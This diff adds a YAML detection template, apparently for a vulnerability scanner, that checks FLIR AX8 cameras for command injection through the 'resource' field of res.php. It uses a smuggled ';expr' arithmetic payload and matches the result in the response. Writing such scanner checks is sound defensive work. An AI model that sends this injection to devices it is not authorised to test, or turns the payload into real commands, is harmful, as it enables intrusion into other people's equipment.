@@ -1,0 +1,27 @@
+id: flix-ax8-command-injection
+
+info:
+  name: FLIR-AX8 res.php
+  author: icey_(https://github.com/iceyjchen/)
+  severity: high
+  description: |
+    FLIR-AX8 res.php 存在命令注入漏洞
+    app="FLIR-FLIR-AX8"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/%E8%8F%B2%E5%8A%9B%E5%B0%94/FLIR-AX8%20res.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /res.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        action=node&resource=;expr%20{{r1}}%20-%20{{r2}}
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
+expression: r0()
